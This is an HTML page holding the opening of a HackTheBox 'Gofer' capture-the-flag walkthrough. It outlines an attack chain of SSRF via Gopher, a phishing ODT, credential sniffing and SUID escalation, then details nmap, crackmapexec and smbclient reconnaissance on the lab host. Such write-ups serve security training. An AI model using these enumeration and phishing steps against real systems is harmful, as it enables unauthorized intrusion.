@@ -1,0 +1,1163 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gofer - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/hard/gofer/img/gofer.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Gofer - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Gofer">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Gofer</span>
+<span class="n">Difficult</span><span class="p">:</span> <span class="n">Hard</span>
+<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">07</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3><br/>About Gofer</h3><br/>
+Gofer is a hard-level machine on the HackTheBox platform. Initially, we encounter a network-level shared resource via SMB that leaks a file containing pertinent information for the first exploitation. It reveals details about an internal SMTP service at the system level. While enumerating subdomains, we discover a section that allows us to conduct an SSRF to interact with internal services of the victim machine.<br/><br/>
+<h3><br>Shell as Jocelyn</br></h3><br>
+Exploiting the SSRF, we utilized the Gopher protocol to send emails. We crafted a malicious ODT file and sent it via email to the user Jocelyn, enticing them to download and execute it, thereby gaining access to the system.<br/><br/>
+<h3><br>Shell as tbuckley</br></h3><br>
+As the user Jocelyn, we have the privilege to execute tcpdump, enabling us to sniff packets at the network level. While sniffing packets, we observed HTTP requests being made within the victim machine, within which credentials belonging to the user <code>tbuckley</code> were transmitted. We leveraged these credentials to gain SSH access to this user.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+As the user tbuckley, we are part of a group that has the privilege to execute an unusual Set-UID binary. After reverse-engineering the binary, we discovered a vulnerability that we could exploit to escalate privileges to the root user.<br/><br/>
+<h3><br>Recon</br></h3><br>
+Firstly, we will conduct a port scan to identify open ports on the target machine. To achieve this, we'll employ the <code>nmap</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.225</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">2.2</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65468</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">63</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+</pre></div>
+
+Upon identifying the open ports on the victim machine, our next step involves executing a comprehensive scan to identify the technologies, services, and versions operating within these ports.<br/><br/>
+Once more, we'll utilize the <code>nmap</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="mf">10.10.11.225</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.225</span> <span class="p">(</span><span class="mf">10.10.11.225</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.22</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>     <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>         <span class="n">OpenSSH</span> <span class="mf">8.4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3072</span> <span class="n">aa</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">1</span><span class="n">a</span><span class="p">:</span><span class="mi">91</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="mi">94</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="n">dd</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">18</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">ba</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="n">e4</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="n">c2</span><span class="p">:</span><span class="n">e5</span><span class="p">:</span><span class="mi">96</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">a4</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">7</span><span class="n">f</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="n">d9</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>        <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.56</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span> <span class="n">Samba</span> <span class="n">smbd</span> <span class="mf">4.6.2</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span> <span class="n">Samba</span> <span class="n">smbd</span> <span class="mf">4.6.2</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">28</span><span class="n">T13</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">11</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
+<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span> 
+<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
+<span class="o">|</span><span class="n">_nbstat</span><span class="p">:</span> <span class="n">NetBIOS</span> <span class="n">name</span><span class="p">:</span> <span class="n">GOFER</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">user</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">MAC</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">unknown</span><span class="p">)</span>
+</pre></div>
+
+At first glance, it's evident that the machine is running an SSH service, an HTTP service, and unusually, an SMB service, which is not commonly found on Linux machines.<br/><br/>
+<h3><br>SMB Enumeration</br></h3><br>
+We'll proceed to enumerate the SMB service using the <code>crackmapexec</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.225</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">6.1</span> <span class="n">Build</span> <span class="mi">0</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">GOFER</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+</pre></div>
+
+The initial indication suggests it's a Windows machine, but this information appears to be incorrect or uninformative. We'll now proceed to enumerate the SMB shares once more using the <code>crackmapexec</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.225</span> <span class="o">--</span><span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">6.1</span> <span class="n">Build</span> <span class="mi">0</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">GOFER</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Error</span> <span class="n">enumerating</span> <span class="n">shares</span><span class="p">:</span> <span class="n">STATUS_USER_SESSION_DELETED</span>
+</pre></div>
+
+It returns <code>STATUS_USER_SESSION_DELETED</code>, which could be indicative of the null session being disabled.<br/><br/>
+Let's attempt to enumerate SMB shares using a Guest Session by solely specifying a username:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.225</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'elswix'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">''</span> <span class="o">--</span><span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">6.1</span> <span class="n">Build</span> <span class="mi">0</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">GOFER</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">htb</span>\<span class="n">elswix</span><span class="p">:</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="nb">print</span><span class="err">$</span>                          <span class="n">Printer</span> <span class="n">Drivers</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="n">shares</span>          <span class="n">READ</span>            
+<span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="n">IPC</span><span class="err">$</span>                            <span class="n">IPC</span> <span class="n">Service</span> <span class="p">(</span><span class="n">Samba</span> <span class="mf">4.13.13</span><span class="o">-</span><span class="n">Debian</span><span class="p">)</span>
+</pre></div>
+
+We've identified an accessible SMB share named <code>shares</code>. We'll now connect to it without specifying a password, using <code>smbclient</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">smbclient</span> <span class="o">//</span><span class="mf">10.10.11.225</span><span class="o">/</span><span class="n">shares</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'elswix'</span>
+<span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">elswix</span><span class="p">]:</span>
+<span class="n">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span>
+</pre></div>
+
+Initially, we notice a directory named <code>.backup</code>. Let's proceed to list its contents:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">cd</span> <span class="o">.</span><span class="n">backup</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">.</span><span class="n">backup</span>\<span class="o">&gt;</span> <span class="n">ls</span>
+  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Thu</span> <span class="n">Apr</span> <span class="mi">27</span> <span class="mi">09</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">32</span> <span class="mi">2023</span>
+  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Fri</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">08</span> <span class="mi">2022</span>
+  <span class="n">mail</span>                                <span class="n">N</span>     <span class="mi">1101</span>  <span class="n">Thu</span> <span class="n">Apr</span> <span class="mi">27</span> <span class="mi">09</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">32</span> <span class="mi">2023</span>
+
+        <span class="mi">5061888</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">1024.</span> <span class="mi">2163516</span> <span class="n">blocks</span> <span class="n">available</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">.</span><span class="n">backup</span>\<span class="o">&gt;</span>
+</pre></div>
+
+There's a file named <code>mail</code>. Unfortunately, I can't read this file using <code>smbclient</code>, so I'll begin by downloading it to my machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">smb</span><span class="p">:</span> \<span class="o">.</span><span class="n">backup</span>\<span class="o">&gt;</span> <span class="n">get</span> <span class="n">mail</span>
+<span class="n">getting</span> <span class="n">file</span> \<span class="o">.</span><span class="n">backup</span>\<span class="n">mail</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">1101</span> <span class="k">as</span> <span class="n">mail</span> <span class="p">(</span><span class="mf">1.5</span> <span class="n">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">1.5</span> <span class="n">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">.</span><span class="n">backup</span>\<span class="o">&gt;</span>
+</pre></div>
+
+Now, I'll be able to read its content using the <code>cat</code> command<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">From</span> <span class="n">jdavis</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span>  <span class="n">Fri</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">20</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span> <span class="mi">2022</span>
+<span class="n">Return</span><span class="o">-</span><span class="n">Path</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">jdavis</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="n">X</span><span class="o">-</span><span class="n">Original</span><span class="o">-</span><span class="n">To</span><span class="p">:</span> <span class="n">tbuckley</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">Delivered</span><span class="o">-</span><span class="n">To</span><span class="p">:</span> <span class="n">tbuckley</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">Received</span><span class="p">:</span> <span class="kn">from</span> <span class="nn">gofer.htb</span> <span class="p">(</span><span class="n">localhost</span> <span class="p">[</span><span class="mf">127.0.0.1</span><span class="p">])</span>
+        <span class="n">by</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="n">Postfix</span><span class="p">)</span> <span class="k">with</span> <span class="n">SMTP</span> <span class="nb">id</span> <span class="n">C8F7461827</span>
+        <span class="k">for</span> <span class="o">&lt;</span><span class="n">tbuckley</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span><span class="p">;</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">28</span> <span class="n">Oct</span> <span class="mi">2022</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">43</span> <span class="o">+</span><span class="mi">0100</span> <span class="p">(</span><span class="n">BST</span><span class="p">)</span>
+<span class="n">Subject</span><span class="p">:</span><span class="n">Important</span> <span class="n">to</span> <span class="n">read</span><span class="err">!</span>
+<span class="n">Message</span><span class="o">-</span><span class="n">Id</span><span class="p">:</span> <span class="o">&lt;</span><span class="mf">20221028192857.</span><span class="n">C8F7461827</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="n">Date</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">28</span> <span class="n">Oct</span> <span class="mi">2022</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">43</span> <span class="o">+</span><span class="mi">0100</span> <span class="p">(</span><span class="n">BST</span><span class="p">)</span>
+<span class="n">From</span><span class="p">:</span> <span class="n">jdavis</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span>
+
+<span class="n">Hello</span> <span class="n">guys</span><span class="p">,</span>
+
+<span class="n">Our</span> <span class="n">dear</span> <span class="n">Jocelyn</span> <span class="n">received</span> <span class="n">another</span> <span class="n">phishing</span> <span class="n">attempt</span> <span class="n">last</span> <span class="n">week</span> <span class="ow">and</span> <span class="n">his</span> <span class="n">habit</span> <span class="n">of</span> <span class="n">clicking</span> <span class="n">on</span> <span class="n">links</span> <span class="n">without</span> <span class="n">paying</span> <span class="n">much</span> <span class="n">attention</span> <span class="n">may</span> <span class="n">be</span> <span class="n">problematic</span> <span class="n">one</span> <span class="n">day</span><span class="o">.</span> <span class="n">That</span><span class="err">`</span><span class="n">s</span> <span class="n">why</span> <span class="kn">from</span> <span class="nn">now</span> <span class="n">on</span><span class="p">,</span> <span class="n">I</span><span class="err">`</span><span class="n">ve</span> <span class="n">decided</span> <span class="n">that</span> <span class="n">important</span> <span class="n">documents</span> <span class="n">will</span> <span class="n">only</span> <span class="n">be</span> <span class="n">sent</span> <span class="n">internally</span><span class="p">,</span> <span class="n">by</span> <span class="n">mail</span><span class="p">,</span> <span class="n">which</span> <span class="n">should</span> <span class="n">greatly</span> <span class="n">limit</span> <span class="n">the</span> <span class="n">risks</span><span class="o">.</span> <span class="n">If</span> <span class="n">possible</span><span class="p">,</span> <span class="n">use</span> <span class="n">an</span> <span class="o">.</span><span class="n">odt</span> <span class="nb">format</span><span class="p">,</span> <span class="k">as</span> <span class="n">documents</span> <span class="n">saved</span> <span class="ow">in</span> <span class="n">Office</span> <span class="n">Word</span> <span class="n">are</span> <span class="ow">not</span> <span class="n">always</span> <span class="n">well</span> <span class="n">interpreted</span> <span class="n">by</span> <span class="n">Libreoffice</span><span class="o">.</span>
+
+<span class="n">PS</span><span class="p">:</span> <span class="n">Last</span> <span class="n">thing</span> <span class="k">for</span> <span class="n">Tom</span><span class="p">;</span> <span class="n">I</span> <span class="n">know</span> <span class="n">you</span><span class="err">`</span><span class="n">re</span> <span class="n">working</span> <span class="n">on</span> <span class="n">our</span> <span class="n">web</span> <span class="n">proxy</span> <span class="n">but</span> <span class="k">if</span> <span class="n">you</span> <span class="n">could</span> <span class="n">restrict</span> <span class="n">access</span><span class="p">,</span> <span class="n">it</span> <span class="n">will</span> <span class="n">be</span> <span class="n">more</span> <span class="n">secure</span> <span class="n">until</span> <span class="n">you</span> <span class="n">have</span> <span class="n">finished</span> <span class="n">it</span><span class="o">.</span> <span class="n">It</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">me</span> <span class="n">that</span> <span class="n">it</span> <span class="n">should</span> <span class="n">be</span> <span class="n">possible</span> <span class="n">to</span> <span class="n">do</span> <span class="n">so</span> <span class="n">via</span> <span class="o">&lt;</span><span class="n">Limit</span><span class="o">&gt;</span>
+</pre></div>
+
+It appears to be an email from <code>jdavis@gofer.htb</code> to <code>tbuckley@gofer.htb</code>. In the email, <code>jdavis</code> mentions a user named <code>Jocelyn</code> who has seemingly fallen victim to a phishing email. There's a reference to <code>.odt</code> files in the context of sharing files through emails. This information is crucial and serves as a key point to consider for the first exploit.<br/><br/>
+<h3><br>Web Application</br></h3><br>
+There's an HTTP Service running on port 80 on the victim machine. This service is associated with a webpage. To initiate the enumeration process, we'll perform a technology scan using the <code>whatweb</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.225</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.225</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.56</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Debian</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.225</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span>
+<span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+While attempting to access the service using the IP address, we were redirected to the <code>gofer.htb</code> domain. Since this domain is not listed in our <code>/etc/hosts</code> file, the system doesn't recognize which IP address corresponds to this domain.<br/><br/>
+Hence, our initial step will be to add this domain to our <code>/etc/hosts</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.225</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+Now, upon attempting to access the service using the IP address, it redirects us to the domain, correctly resolving to the appropriate IP.<br/><br/>
